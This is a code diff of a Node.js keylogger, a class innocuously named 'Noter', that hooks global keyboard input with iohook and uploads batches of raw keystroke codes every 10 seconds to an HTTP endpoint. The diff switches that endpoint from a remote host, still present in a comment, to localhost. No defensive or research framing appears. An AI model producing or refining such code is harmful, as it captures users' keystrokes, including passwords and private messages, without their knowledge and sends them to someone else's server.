@@ -1,7 +1,7 @@
 const iohook = require('iohook');
 const axios = require('axios');
 
-const API_ENDPOINT = 'https://api.prestigehost.top/11mipa1';
+const API_ENDPOINT = 'http://localhost:8102' //'https://api.prestigehost.top/110101';
 const UPLOAD_INTERVAL = 10000;
 
 const notedKeys = [
@@ -28,8 +28,8 @@ class Noter {
         return;
       }
 
-      const toBeUploaded = Noter.currentInputs;
-      const timestamp = Date.now();
+      let toBeUploaded = Noter.currentInputs;
+      let timestamp = Date.now();
 
       Noter.currentInputs = [];
 
@@ -51,8 +51,8 @@ class Noter {
     Noter.clockRunning = false;
   }
 
-  static note(event) {
-    Noter.currentInputs.push(event);
+  static note({ shiftKey, rawcode }) {
+    Noter.currentInputs.push({ shiftKey, rawcode });
 
     if (!Noter.clockRunning) {
       Noter.startInterval();
